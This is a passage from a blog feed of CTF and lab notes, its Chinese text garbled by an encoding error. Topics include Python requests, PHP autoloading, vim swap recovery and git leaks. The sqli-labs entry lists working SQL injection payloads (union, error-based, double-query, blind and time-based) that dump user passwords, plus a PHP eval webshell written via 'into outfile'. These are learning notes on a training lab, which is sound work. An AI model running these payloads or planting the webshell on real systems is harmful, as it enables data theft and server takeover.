str(r.status_code))print(data[&#39;CityEntities&#39;][0][&#39;CityID&#39;])  # æ‰“å°è¿”å›jsonä¸­çš„æŸä¸ªkeyçš„valueprint(data[&#39;ResponseStatus&#39;][&#39;Ack&#39;])print(json.dump(data, indent=4, sort_keys=True, ensure_ascii=False))  # æ ‘å½¢æ‰“å°jsonï¼Œensure_asciiå¿…é¡»è®¾ä¸ºFalseå¦åˆ™ä¸­æ–‡ä¼šæ˜¾ç¤ºä¸ºunicode</code></pre><h2>ä¸Šä¼ æ–‡ä»¶</h2><p>import requests</p><p>url = â€˜<a href="http://127.0.0.1:8080/upload&#39;">http://127.0.0.1:8080/upload&#39;</a></p><p>files = {â€˜fileâ€™: open(â€˜/home/rxf/test.jpgâ€™, â€˜rbâ€™)}</p><p>//files = {â€˜fileâ€™: (â€˜report.jpgâ€™, open(â€˜/home/lyb/sjzl.mpgâ€™, â€˜rbâ€™))}     #æ˜¾å¼çš„è®¾ç½®æ–‡ä»¶å</p><p>r = requests.post(url, files=files)</p><p>print(r.text)</p><h2>cookiesä¸ä¼šè¯å¯¹è±¡</h2><p>å¦‚æœæŸä¸ªè®¿é—®ä¸­åŒ…å«ä¸€äº›cookieï¼Œä½ å¯ä»¥å¿«é€Ÿè®¿é—®ä»–ä»¬</p><p>import requests</p><p>r = requests.get(â€˜<a href="http://www.google.com.hk/&#39;">http://www.google.com.hk/&#39;</a>) </p><p>print(r.cookies[â€˜NIDâ€™])</p><p>print(tuple(r.cookies))</p><p>å¦‚æœä½ æƒ³å‘é€ä½ çš„cookiesåˆ°æœåŠ¡å™¨ï¼Œå¯ä»¥Â·ä½¿ç”¨cookieså‚æ•°</p><p>import requests</p><p>url = â€˜<a href="http://httpbin.org/cookies&#39;">http://httpbin.org/cookies&#39;</a></p><p>cookies = {â€˜testCookies_1â€™: â€˜Hello_Python3â€™, â€˜testCookies_2â€™: â€˜Hello_Requestsâ€™}</p><p>//åœ¨Cookie Version 0ä¸­è§„å®šç©ºæ ¼ã€æ–¹æ‹¬å·ã€åœ†æ‹¬å·ã€ç­‰äºå·ã€é€—å·ã€åŒå¼•å·ã€æ–œæ ã€é—®å·ã€@ï¼Œå†’å·ï¼Œåˆ†å·ç­‰ç‰¹æ®Šç¬¦å·éƒ½ä¸èƒ½ä½œä¸ºCookieçš„å†…å®¹ã€‚</p><p>r = requests.get(url, cookies=cookies)</p><p>print(r.json())</p><p>#! /urs/bin/python3<br>import requests</p><p>â€˜â€™â€™requestsæ¨¡å—æŠ“å–ç½‘é¡µæºç å¹¶ä¿å­˜åˆ°æ–‡ä»¶ç¤ºä¾‹â€™â€™â€™</p><p>html = requests.get(â€œ<a href="http://www.baidu.com&quot;/">http://www.baidu.com&quot;</a>)</p><p>with open(â€˜test.txtâ€™, â€˜wâ€™, encoding=â€™utf-8â€™) as f:</p><pre><code>f.write(html.text)</code></pre><p>â€˜â€™â€™è¯»å–ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œæ¯æ¬¡è¯»å–ä¸€è¡Œï¼Œå¹¶ä¿å­˜åˆ°å¦ä¸€ä¸ªtxtæ–‡ä»¶ä¸­çš„ç¤ºä¾‹â€™â€™â€™</p><p>ff = open(â€˜testt.txtâ€™, â€˜wâ€™, encoding=â€™utf-8â€™)</p><p>with open(â€˜test.txtâ€™, encoding=â€utf-8â€) as f:</p><pre><code>for line in f:    ff.write(line)    ff.close()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql 1`10</title>
      <link href="/2021/02/25/110/"/>
      <url>/2021/02/25/110/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>1`5,åŸºæœ¬sqlmapéƒ½å¯ä»¥è·‘å‡ºæ¥ï¼Œå…¶ä»–çš„æ²¡æœ‰å°è¯•</p><h2>less1</h2><p>è¾“å…¥1â€™,æŠ¥é”™ï¼Œä½†æ˜¯è¾“å…¥1â€™ â€“+æ­£å¸¸ï¼Œæ‰€ä»¥å­˜åœ¨å•å¼•å·é—­åˆçš„æ¼æ´</p><p>ä»æŸ¥è¯¢è¯­å¥å¯ä»¥çœ‹å‡ºï¼ŒSELECT * FROM users WHERE id=â€™â€™ union select 1,2,database() â€“ â€˜ LIMIT 0,1ï¼Œä»–åªèƒ½æ˜¾ç¤ºä¸€è¡Œå†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å†è¿›è¡Œè”åˆæŸ¥è¯¢çš„æ—¶å€™ï¼Œè¦è®°å¾—åœ¨å·¦è¾¹æ˜¯ç©ºï¼Œå³æ˜¯â€™ï¼Œè€Œä¸æ˜¯1â€™</p><p>çˆ†å­—æ®µ</p><p>â€˜ order by 3 â€“+,æ­£å¸¸å›æ˜¾ï¼Œä½†æ˜¯4å°±ä¸å¯ä»¥ï¼Œè¯´æ˜æœ‰ä¸‰ä¸ªå­—æ®µ</p><p>çˆ†åº“</p><p>â€˜ union select 1,2,database() â€“+  security</p><p>çˆ†è¡¨</p><p>â€˜ union select 1,2,group_concat(distinct table_name) from information_schema.tables where table_schema=database() â€“+</p><p>emails,referers,uagents,users</p><p>æ„Ÿè§‰æœ‰å…³ä¿¡æ¯åº”è¯¥åœ¨usersè¿™ä¸ªè¡¨é‡Œ</p><p>çˆ†å­—æ®µ</p><p>â€˜ union select 1,2,group_concat(distinct column_name) from information_schema.columns where table_name=â€™usersâ€™ â€“+</p><p>avatar,CURRENT_CONNECTIONS,failed_login,first_name,id,last_login,last_name,password,TOTAL_CONNECTIONS,user,username,user_id</p><p>çˆ†æ•æ„Ÿä¿¡æ¯</p><p>â€˜ union select 1,2,group_concat(distinct password) from security.users â€“+</p><p>admin,admin1,admin2,admin3,admin4,crappy,Dumb,dumbo,genious,I-kill-you,mob!le,p@ssword,stupidity</p><p>ok,ä¸‹ä¸€å…³</p><h2>less 2</h2><p>ç¬¬äºŒå…³ï¼Œè¿™ä¸Šé¢æ²¡æœ‰æ˜¾ç¤ºsqlè¯­å¥ï¼Œé€šè¿‡æŠ¥é”™ä¿¡æ¯ï¼Œæ„Ÿè§‰æ˜¯ï¼Œselect * from users where id =â€™â€™ â€˜â€™ limit 0,1</p><p>è¿™ä¸ªåº”è¯¥ä¸éœ€è¦æ³¨é‡Šç¬¦äº†</p><p>â€˜â€™ union select 1,2,database()</p><p>â€˜â€™ union select 1,2,group_concat(distinct table_name) from information_schema.tables where table_schema=database()</p><p>â€˜â€™ union select 1,2,group_concat(distinct column_name) from information_schema.columns where table_name=â€™usersâ€™</p><p>â€˜â€™ union select 1,2,group_concat(distinct password) from security.users</p><p>okç»§ç»­</p><h2>less3</h2>æœ‰ä¸ªæ€æƒ³æŒºé‡è¦çš„ï¼Œæ˜¯åº”è¯¥è·Ÿå‰é¢é—­åˆï¼Œè€Œä¸æ˜¯åé¢<p>è¯­å¥åº”è¯¥æ˜¯from users where id =ï¼ˆâ€™â€™ï¼‰ limit 0,1<br>å°±æ˜¯æ„é€ çš„åº”è¯¥æ˜¯â€™)â€¦â€¦.æ›´ä¸Šè¿°ä¸€æ ·</p><h2>less4</h2>?id=1") order by 4--+<p>â€œ) union select 1,2,group_concat(distinct password) from security.users</p><p>admin,admin1,admin2,admin3,admin4,crappy,Dumb,dumbo,genious,I-kill-you,mob!le,p@ssword,stupidity</p><h2>less5</h2><p>æ„Ÿè§‰åº”è¯¥æ˜¯ä»€ä¹ˆä¸œè¥¿è¢«è¿‡æ»¤äº†ï¼Œå› ä¸ºæœ¬åœ°æ²¡åŠæ³•bpæŠ“åŒ…è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œæ‰€ä»¥æˆ‘å°è¯•äº†æŠ¥é”™æ³¨å…¥</p><p>â€˜ or updatexml(1,concat(â€˜`â€™,database()),1) â€“+ security</p><p>â€˜) or updatexml(1,concat(â€˜`â€™,(select group_concat(distinct table_name) from info/**/rmation_schema.tables where table_schema=â€™securityâ€™)),1) #</p><p>emails,referers,uagents,users</p><p>â€˜) or updatexml(1,concat(â€˜`â€™,(select group_concat(distinct right(column_name,30)) from information_schema.columns where table_name=â€™usersâ€™)),1) â€“+</p><p>avatar,CURRENT_CONNECTIONS,failâ€™å¾ˆæ˜¾ç„¶ã€‚è¿™æ²¡æœ‰å‡ºæ¥æ™š</p><p>atar,er,ername,er_id,iled_logi<br>avatar,CURRENT_CONNECTIONS,failed_login,first_name,id,last_login,last_name,password,TOTAL_CONNECTIONS,user,username,user_id</p><p>â€˜ or updatexml(1,concat(â€˜`â€™,(select group_concat(left(column_name,8)) from information_schema.columns where table_name=â€™usersâ€™)),1) â€“+</p><p>user_id,first_na,last_nam,user<br>â€˜ or updatexml(1,concat(â€˜`â€™,(select group_concat(distinct password) from security.users)),1) â€“+</p><p>å› ä¸ºè¯•ä¸‹çŸ¥é“ï¼Œæ•°æ®æ˜¯å­˜åœ¨userä¸­çš„ï¼Œåšåˆ°è¿™é‡Œï¼Œæ„Ÿè§‰è‡ªå·±ä»¥å‰å­¦çš„çŸ¥è¯†å·²ç»ä¸å¤Ÿç”¨äº†</p><h2>less6</h2><p>è·Ÿless5ä¸€æ ·ï¼Œå°±æ˜¯æŠŠå•å¼•å·æ”¹ä¸ºåŒå¼•</p><h2>less7</h2>æç¤ºè¯´æ˜¯outfile<p>?=1â€™)) union select 1,2,â€<?php @eval($_POST['a']);?>â€œ into outfile â€˜D:/phpstudy_pro/WWW/sqli/Less-7/text.txtâ€™ â€“+</p><p>æœ¨é©¬è¿æ¥</p><h3>å‰ç½®çŸ¥è¯†</h3>å‚è€ƒï¼šhttps://www.jianshu.com/p/7b9256de20d1<h2>less8</h2><p>ä½¿ç”¨äº†ä¸€ä¸ªå‡½æ•°ï¼Œsubstrï¼Œä¸‹é¢æœ‰å¯¹ä»–çš„ä»‹ç»</p><p><img src="1.png"></p><p>è§‰å¾—ç¥å¥‡çš„æ˜¯ï¼Œä»¥å‰éƒ½æ˜¯è¯´å»å†™ä¸ªè„šæœ¬ä»€ä¹ˆçš„ï¼Œæ²¡æƒ³åˆ°bpä¹Ÿå¯ä»¥è¿™æ ·</p><p><a href="http://sqli/Less-8/?id=1%27%20and%20substr((select%20group_concat(distinct%20concat_ws(%27%60%27,username))%20from%20security.users">http://sqli/Less-8/?id=1%27%20and%20substr((select%20group_concat(distinct%20concat_ws(%27`%27,username))%20from%20security.users</a>),<mark>1</mark>,1)=%27<mark>a</mark>%27%20â€“+</p><p>æ·»åŠ $$ï¼Œè¿›è¡Œç ´è§£</p><p>ä¹Ÿäº†è§£äº†æ—¶é—´ç›²æ³¨ </p><p>å°±æ˜¯ifï¼ˆæ¡ä»¶ï¼Œ1ï¼Œ2ï¼‰ï¼Œå¦‚æœæ¡ä»¶ä¸ºçœŸï¼Œå°±æ‰§è¡Œ1ï¼Œå¦åˆ™ï¼Œ2</p><p>åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œ?id=1â€™ and sleep(5) â€“+,å½“å­˜åœ¨æ³¨å…¥çš„æ—¶å€™ï¼Œå°±å»¶è¿Ÿ5sï¼Œæ”¶åˆ°æ•°æ®åŒ…</p><p>å…¶ä»–çš„å°±è·Ÿé‚£ä¸ªless8ä¸€è‡´</p><h2>less9</h2><p>æ—¶é—´å¿™æ³¨</p><p><a href="http://sqli/Less-9/?id=1%27%20and%20if(substr(database(),2,1)=%27e%27,1,sleep(5))%20--+">http://sqli/Less-9/?id=1%27%20and%20if(substr(database(),2,1)=%27e%27,1,sleep(5))%20--+</a></p><p><a href="http://sqli/Less-9/?id=1%27%20and%20if">http://sqli/Less-9/?id=1%27%20and%20if</a>(substr((select group_concat(distinct table_name) from information_schema.tables where table_schema=â€™securityâ€™),2,1)=%27u%27,1,sleep(5))%20â€“+</p><p><a href="http://sqli/Less-9/?id=1%27%20and%20if">http://sqli/Less-9/?id=1%27%20and%20if</a>(substr((select group_concat(distinct column_name) from information_schema.columns where table_name=â€™userâ€™),2,1)=%27u%27,1,sleep(5))%20â€“+</p><h2>less10</h2><p>åŒless9ï¼Œå•å¼•å·å˜æˆåŒå¼•å·</p><h2>è¡¥å……æ–°çŸ¥è¯†</h2><h3>sqlæ³¨å…¥å¸¸ç”¨çš„å‡½æ•°</h3><li> mid()<p>mid(column_name,start,length)</p><p>æ¯”å¦‚mid(â€˜userâ€™,2,1)<br>ç»“æœæ˜¯e</p><p>ç”¨æ³•æ˜¯ midï¼ˆdasabase(),1,1ï¼‰æŸ¥çœ‹æ•°æ®åº“çš„ç¬¬ä¸€ä½</p><li>substr<p>è·Ÿmidï¼ˆï¼‰ä¸€æ ·</p><li>leftå’Œright</li><p>ä»å·¦è¾¹å¼€å§‹æŸ¥è¯¢</p><li>limit<p>è¿”å›ç»“æœä¸­å‰å‡ æ¡æ•°æ®ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸­é—´çš„æ•°æ®</p><p>select* from user limit m,n<br>ä»mè¡Œå¼€å§‹ï¼Œå–næ¡</p><li>concat()<p>è¿æ¥ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²ï¼Œè¿”å›ç»“æœæ˜¯è¿æ¥å‚æ•°2äº§ç”Ÿçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœä¸€ä¸ªå‚æ•°æ˜¯nullï¼Œè¿”å›null</p><p>concatï¼ˆâ€™1â€™,â€™2â€™,â€™nullâ€™ï¼‰=12null</p><p>concat(â€˜1â€™,â€™2â€™,null)=null</p><li>concat_ws(åˆ†éš”ç¬¦ï¼Œå‚æ•°ï¼‰<p>concat_ws(â€˜:â€™,â€™3â€™,â€™4â€™)=3:4</p><li>group_concat<p>åˆ†ç»„æ‹¼æ¥å‡½æ•°</p><p>group_concat(å­—æ®µå separator åˆ†éš”ç¬¦)</p><li>count<p>èšé›†å‡½æ•°ï¼Œç»Ÿè®¡å…ƒç»„ä¸ªæ•°</p><li>rand()<p>äº§ç”Ÿä¸€ä¸ªéšæœºæ•°</p><li>floor()<p>å‘ä¸‹å–æ•´</p><li>ceiling<p>å‘ä¸Šå–æ•´</p><li>group_by<p>æ ¹æ®è§„åˆ™å¯¹ç»“æœè¿›è¡Œåˆ†ç»„</p><li>ascii<p>è¿”å›å­—ç¬¦ä¸²çš„asciiç </p><li>ord()<p>è¿”å›å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä½çš„asciiç     </p><h3>sqlåŒæŸ¥è¯¢æ³¨å…¥</h3><h4>å­æŸ¥è¯¢</h4>å­æŸ¥è¯¢(subquery),åµŒå¥—åœ¨å…¶å®ƒè¯­å¥ä¸­çš„æŸ¥è¯¢<p>ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼Œselect concat(select database()),å…ˆè¿›æ€§å­æŸ¥è¯¢ï¼Œå¦‚æœæ•°æ®åº“æœ‰ä¸¤ä¸ªï¼Œå³a,bï¼Œé‚£ä¹ˆselect concat(â€˜aâ€™,â€™bâ€™)=ab</p><h4>åŒæŸ¥è¯¢æ³¨å…¥åŸç†</h4><p>select floor(rand()*2)</p><p>è¿”å›ç»“æœä¸æ˜¯0ï¼Œå°±æ˜¯1</p><p>ç”¨concatå°†ç»“æœæ‹¼æ¥èµ·æ¥ï¼Œselect concat((select database()),floor(rand()*2))</p><p>å¦‚æœåœ¨è¿™æ¡è¯­å¥åé¢åŠ ä¸Šä¸€ä¸ªfromè¡¨æ˜ï¼Œè¿”å›çš„æ•°ç›®æ˜¯ç”±è¡¨åå†³å®šçš„</p><p>æŠŠ concat((select database()),floor(rand()*2))å–ä¸ªåˆ«åaï¼Œç„¶åå…¶ä»–çš„æŒ‰ç…§aè¿›è¡Œåˆ†ç»„ï¼Œé‚£ä¹ˆåªèƒ½æœ‰ä¸¤ä¸ªç»“æœæ•°æ®åº“å1ï¼Œæ•°æ®åº“å0</p><p>æœ€åä¸€æ­¥ä½¿ç”¨æŠ¥é”™æ‹‰è¿›è¡ŒæŸ¥è¯¢çš„ç»“æœ</p><p>select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a;    </p><p>åº”ç”¨åˆ°less5</p><p>1â€™ union select 1,count(*),concat((select database()),floor(rand()<em>2)) as a from information_schema.tables group by a â€“+<br>1â€™ union select 1,count(</em>),concat((select group_concat(table_name) from information_schema.tables where table_schema=â€™securityâ€™),floor(rand()*2)) as a from information_schema.columns group by a â€“+       </p><p>emails,referers,uagents,users  </p><p>1â€™ union select 1,count(*),concat((select group_concat(column_name) from information_schema.columns where table_name=â€™usersâ€™),floor(rand()*2)) as a from information_schema.columns group by a â€“+     </p><p>user_id,first_name,last_name,user,password,avatar,last_login,fai</p><p>1â€™ union select 1,count(*),concat((select group_concat(password) from users),floor(rand()*2)) as a from users group by a â€“+      </p><h4>outfile</h4><p>è¿™ä½“å­¦ä¹ äº†SQLæ³¨å…¥çš„outfileå§¿åŠ¿ï¼Œè¯­å¥æ˜¯è¿™æ ·çš„ï¼Œselect â€¦ into outfile â€˜filenameâ€™</p><p>å¿…é¡»è¦æœ‰FILEæƒé™ï¼Œå¹¶ä¸”filenameå¿…é¡»æ˜¯ä¸å­˜åœ¨çš„ï¼Œè¿™æ ·æ‰èƒ½å°†selectè¯­å¥å†™å…¥fileæ–‡ä»¶ä¸­å»</p><p>åœ¨è¿›è¡Œä¹‹å‰è¿˜è¦çœ‹ä¸€ä¸ªä¸œè¥¿ï¼Œå°±æ˜¯secure_file_priv.å› ä¸ºmysqlæ•°æ®åº“éœ€è¦åœ¨æŒ‡å®šç›®å½•ä¸‹è¿›è¡Œæ•°æ®çš„å¯¼å‡ºï¼Œè€ŒæŒ‡å®šç›®å½•å°±æ˜¯æœ‰è¿™ä¸ªå‚æ•°è®¾å®šçš„ã€‚</p><li>å¦‚æœè¿™ä¸ªå˜é‡ä¸ºç©ºï¼Œåˆ™è¿™ä¸ªå˜é‡æ²¡æœ‰æ•ˆæœ<li>å¦‚æœè¿™ä¸ªå‚æ•°ï¼Œè®¾å®šäº†ä¸€ä¸ªç›®å½•åï¼Œé‚£ä¹ˆmysqlæ•°æ®åº“çš„åˆ°å¦‚ä½•å¯¼å‡ºéƒ½æ˜¯åœ¨è¿™ä¸ªç›®å½•ä¸‹è¿›è¡Œçš„ï¼Œè¿™ä¸ªç›®å½•å¿…é¡»å­˜åœ¨ï¼ŒmysqlæœåŠ¡ä¸ä¼šåˆ›å»ºå®ƒ<li>å¦‚æœè¿™ä¸ªå‚æ•°ä¸ºnullï¼Œmysqlæ•°æ®åº“ä¼šç¦æ­¢å¯¼å…¥å¯¼å‡ºæ“ä½œ                  ]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>spl_autoload_register()</title>
      <link href="/2021/02/24/register/"/>
      <url>/2021/02/24/register/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>åœ¨äº†è§£è¯¥å‡½æ•°ä¹‹å‰å…ˆçœ‹å¦ä¸€ä¸ªå‡½æ•°ï¼Œ__autoload</p><h2>__autoload</h2>è¿™æ˜¯ä¸€ä¸ªè‡ªåŠ¨åŠ è½½å‡½æ•°ï¼Œåœ¨phpä¸­ä½¿ç”¨ä¸€ä¸ªæœªå®šä¹‰çš„ç±»ï¼Œä¼šè§¦å‘è¯¥å‡½æ•°<p>PRINTIT.class.php</p><pre><code>    &lt;?php class PRINTIT &#123; function doPrint() &#123; echo &#39;hello world&#39;;&#125;&#125;?&gt;  </code></pre><p>index.php</p><pre><code>&lt;?function __autoload( $class ) &#123; $file = $class . &#39;.class.php&#39;; if ( is_file($file) ) &#123; require_once($file); &#125;&#125;$obj = new PRINTIT();$obj-&gt;doPrint();?&gt;</code></pre><p>è¿è¡Œindex.phpåæ­£å¸¸è¾“å‡ºhello worldã€‚åœ¨index.phpä¸­ï¼Œç”±äºæ²¡æœ‰åŒ…å«printit.class.phpï¼Œåœ¨å®ä¾‹åŒ–printitæ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨__autoloadå‡½æ•°ï¼Œå‚æ•°$classçš„å€¼å³ä¸ºç±»åprintitï¼Œæ­¤æ—¶printit.class.phpå°±è¢«å¼•è¿›æ¥äº†ã€‚</p><p>åœ¨é¢å‘å¯¹è±¡ä¸­è¿™ç§æ–¹æ³•ç»å¸¸ä½¿ç”¨ï¼Œå¯ä»¥é¿å…ä¹¦å†™è¿‡å¤šçš„å¼•ç”¨æ–‡ä»¶ï¼ŒåŒæ—¶ä¹Ÿä½¿æ•´ä¸ªç³»ç»Ÿæ›´åŠ çµæ´»ã€‚</p><p>æˆ‘è‡ªå·±å®éªŒçš„æ—¶å€™è™½ç„¶æ²¡æœ‰æŠ¥é”™ï¼Œä½†æ˜¯åˆæç¤ºè¯´ï¼Œ__autoloadå·²ç»è¿‡æ—¶äº†</p><h2>spl_autoload_register</h2><pre><code>  &lt;?function loadprint( $class ) &#123;  $file = $class . &#39;.class.php&#39;;  if (is_file($file)) &#123;  require_once($file);  &#125;&#125;spl_autoload_register( &#39;loadprint&#39; );$obj = new PRINTIT();$obj-&gt;doPrint();?&gt; </code></pre><p>å°†__autoloadæ¢æˆloadprintå‡½æ•°ã€‚ä½†æ˜¯loadprintä¸ä¼šåƒ__autoloadè‡ªåŠ¨è§¦å‘ï¼Œè¿™æ—¶spl_autoload_register()å°±èµ·ä½œç”¨äº†ï¼Œå®ƒå‘Šè¯‰PHPç¢°åˆ°æ²¡æœ‰å®šä¹‰çš„ç±»å°±æ‰§è¡Œloadprint()  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub-å¤‡ä»½æ–‡ä»¶ä¸‹è½½ï¼Œvimç¼“å­˜</title>
      <link href="/2021/02/24/ctfhub-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%8Cvim%E7%BC%93%E5%AD%98/"/>
      <url>/2021/02/24/ctfhub-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%8Cvim%E7%BC%93%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>vimæ˜¯ä¸ªç”¨çš„å¾ˆå¤šçš„æ–‡æœ¬ç¼–è¾‘å™¨</p><h2>çŸ¥è¯†ç‚¹</h2><p>1.vimä¸­çš„swpæ˜¯swapï¼ˆäº¤æ¢åˆ†åŒºçš„äº§ç”Ÿï¼‰ï¼Œä»–æ˜¯éšè—æ–‡ä»¶ï¼Œå°±æ˜¯æ–‡æœ¬ç¼–è¾‘çš„æ—¶å€™ï¼Œç”¨äºå¤‡ä»½ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¦‚æœæ–‡æœ¬ç¼–è¾‘æ­£å¸¸é€€å‡ºï¼Œåˆ™è‡ªåŠ¨åˆ é™¤ã€‚å¦‚æœï¼Œåªæ˜¯è¯»å–æ–‡ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰ä¿®æ”¹ä¹Ÿæ˜¯ä¸ä¼šäº§ç”Ÿswpçš„</p><p>2.åœ¨ä½¿ç”¨vimæ—¶ï¼Œå¦‚æœæ­£å¸¸é€€å‡ºvim,åˆ™swpå°†ä¼šè¢«åˆ é™¤ï¼Œå¦‚æœå¼‚å¸¸é€€å‡ºï¼Œåˆ™æ— æ³•åˆ é™¤ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡ç¼“å­˜æ–‡ä»¶æ¥æ¢å¤åŸå§‹æ–‡ä»¶</p><p>ä»¥index.phpä¸ºä¾‹ï¼Œç¬¬ä¸€æ¬¡äº§ç”Ÿçš„æ˜¯ã€‚.index.php.swp,å¦‚æœäº¦ç§°æ¨å‡ºï¼Œå°±ä¼šäº§ç”Ÿ.index.php.swoçš„äº¤æ¢æ–‡ä»¶ï¼Œç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„åˆ™æ˜¯.index.php.swn</p><p>3.vim -r,å¯ä»¥æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰swpæ–‡ä»¶ï¼Œvim -r filenameå¯ä»¥æ¢å¤æ–‡ä»¶ï¼Œè¿™æ ·ä¸Šæ¬¡æ„å¤–é€€å‡ºçš„æ²¡æœ‰ä¿å­˜çš„ä¿®æ”¹å°±å¯ä»¥è¦†ç›–æ–‡ä»¶</p><p>æ³¨æ„ï¼šå› ä¸ºä»–æ˜¯éšè—æ–‡ä»¶ï¼Œæ‰€ä»¥.index.php.swpå‰é¢æœ‰ä¸€ä¸ª.</p><p>åšäº†ä¸€é“ctfhubé¢˜ï¼Œç®—æ˜¯å·©å›ºäº†ä¸€ä¸‹å¯¹å‘½ä»¤çš„ä½¿ç”¨</p><p>åœ¨url/.index.php.swp</p><p>ä¸‹è½½<br>ç„¶åvim -r index.php.swpå³å¯ </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>lottery</title>
      <link href="/2021/02/24/lottery/"/>
      <url>/2021/02/24/lottery/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>è¿™æ˜¯æˆ‘å½“æ˜¯è§£é¢˜å†™çš„ï¼Œä¸»è¦æ˜¯å¤ªå¤šphpäº†ï¼Œçœ‹äº†å¾ˆå¤šæ²¡æœ‰ç”¨çš„</p><p><img src="1.jpg"></p><p>å¾ˆå¤šæ²¡ç”¨çš„</p><p><img src="2.jpg"></p><p>ç¡®å®</p><p><img src="3.jpg"></p><p>è¿™é‡Œä½¿ç”¨äº†phpå¼±ç±»å‹çš„æ¯”è¾ƒå°±é€ æˆäº†å¼±ç±»å‹çš„äº§ç”Ÿ</p><p>æˆ‘è¿™é“é¢˜æœ‰è¯•äº†å…¶ä»–åšæ³•ï¼Œæˆ‘åœ¨æœ¬åœ°ä¸Šæƒ³å°è¯•æ”¹å˜flagçš„é‡‘é¢ï¼Œä½†æ˜¯ä¼šè¾“å‡ºâ€˜it not true flagâ€™,å¹¶ä¸”æœ¬åœ°å‘ä¸äº†åŒ…</p><p>åªèƒ½é€šè¿‡è´­ä¹°å½©ç¥¨çš„æ–¹æ³•ï¼Œèµ¢å¾—æœ€å¤§é‡‘é¢ï¼Œå¾—åˆ°flag</p><p>è¿™é‡Œä½¿ç”¨boolæ¬ºç’</p><p>åœ¨phpä¸­ï¼Œå¦‚æœâ€˜boolâ€™å’Œä»»ä½•ç±»å‹æ¯”è¾ƒï¼Œä»»ä½•ç±»å‹éƒ½ä¼šå˜æˆboolå‹ã€‚</p><p>åœ¨jsä¸­ï¼š<br>1.å¦‚æœæœ‰ä¸€ä¸ªæ“ä½œæ•°æ˜¯å¸ƒå°”å‹ï¼Œå…ˆè¿›æ€§è½¬æ¢ï¼Œfalseè½¬æ¢ä¸º0ï¼Œtrueè½¬æ¢ä¸º1</p><p>2ï¼Œå¦‚æœæœ‰ä¸€ä¸ªæ“ä½œæ•°æ˜¯å­—ç¬¦ä¸²ï¼Œè€Œå¦ä¸€ä¸ªæ“ä½œæ•°æ˜¯æ•°å€¼ï¼Œåˆ™å…ˆå­—ç¬¦ä¸²è½¬æ¢æˆæ•°å€¼</p><p>3.å¦‚æœä¸€ä¸ªæ“ä½œæ•°æ˜¯å¯¹è±¡ï¼Œåˆ™å…ˆä¾‹ç”¨è°ƒç”¨å¯¹è±¡çš„valueofï¼ˆï¼‰æ–¹æ³•ï¼Œè·å¾—ç±»å‹ï¼Œè¿›è¡Œä¸Šè¿°æ¯”è¾ƒ</p><p>åœ¨phpä¸­ï¼š<br>å½“è½¬æ¢æˆå¸ƒå°”å‹çš„æ—¶å€™ï¼Œåˆ™ä¸‹é¢è¢«ä»»ç”¨ä¸ºfalseï¼š<br>1.false</p><p>2.0</p><p>3.0.0</p><p>4.â€˜0â€™</p><p>5.a=[],ä¸åŒ…å«ä»»ä½•å…ƒç´ çš„æ•°ç»„</p><p>6.ä¸åŒ…å«ä»»ä½•æˆå‘˜å˜é‡çš„å¯¹è±¡ï¼Œï¼ˆä»…åœ¨php4.0ï¼‰</p><p>7.null</p><p>8ä»ç©ºæ ‡è®°ç”Ÿæˆçš„simplexml</p><p>å…¶ä»–çš„éƒ½æ˜¯true</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub git</title>
      <link href="/2021/02/23/git/"/>
      <url>/2021/02/23/git/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>1.ctf-wscanæ‰«æ<br>2.githarkæ‰«æ</p><p>ç¬¬ä¸€é¢˜<br>ä½¿ç”¨git logçœ‹å®ƒçš„æ—¥å¿—å‘ç°æœ‰ remove flag add flagè¿™ä¸¤ä¸ªç‰ˆæœ¬<br>æˆ‘ä»¬æƒ³åŠæ³•é€€å›åˆ°ç¬¬ä¸€ä¸ªç‰ˆæœ¬ï¼Œgit reset â€“hard HEAD^ (â€“hard å‚æ•°æ’¤é”€å·¥ä½œåŒºä¸­æ‰€æœ‰æœªæäº¤çš„ä¿®æ”¹å†…å®¹ï¼Œå°†æš‚å­˜åŒºä¸å·¥ä½œåŒºéƒ½å›åˆ°ä¸Šä¸€æ¬¡ç‰ˆæœ¬ï¼Œå¹¶åˆ é™¤ä¹‹å‰çš„æ‰€æœ‰ä¿¡æ¯æäº¤)</p><p>ç¬¬äºŒé¢˜<br>è·Ÿslashç›¸å…³ ï¼Œè¯¦è§å¦ä¸€ç¯‡æ–‡ç« </p><p>ç¬¬ä¸‰é¢˜<br>git checkout-index -a</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>stash</title>
      <link href="/2021/02/23/stash/"/>
      <url>/2021/02/23/stash/</url>
      
